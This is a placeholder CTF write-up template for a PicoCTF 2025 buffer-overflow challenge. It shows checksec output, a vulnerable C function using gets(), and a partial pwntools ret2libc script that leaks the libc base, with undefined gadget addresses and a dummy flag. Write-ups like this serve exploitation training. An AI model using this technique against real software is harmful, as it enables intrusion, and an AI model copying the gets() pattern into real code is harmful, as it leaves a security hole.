---
title: "PicoCTF 2025: Binary Exploitation Writeup"
date: 2025-03-15
description: "Walkthrough of a buffer overflow challenge using ret2libc technique with ASLR bypass."
category: ctf-writeups
tags: [CTF, Binary Exploitation, ret2libc, ASLR, pwntools]
series: "PicoCTF 2025"
seriesPart: 1
---

# PicoCTF 2025: Binary Exploitation

This is a placeholder CTF writeup. Replace with your actual writeup content.

## Challenge Overview

The binary had the following protections:

```
$ checksec --file=./vuln
[*] '/challenge/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Analysis

The vulnerability is a classic stack buffer overflow in `gets()`.

```c
void vuln() {
    char buf[32];
    gets(buf);  // no bounds checking
}
```

## Exploitation

With NX enabled but no canary and no PIE, we use ret2libc.

```python
from pwn import *

p = process('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Stage 1: leak libc base
payload = b'A' * 40
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

p.sendline(payload)
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.sym['puts']
```

## Conclusion

Classic ret2libc. Flag: `picoCTF{example_flag_here}`.
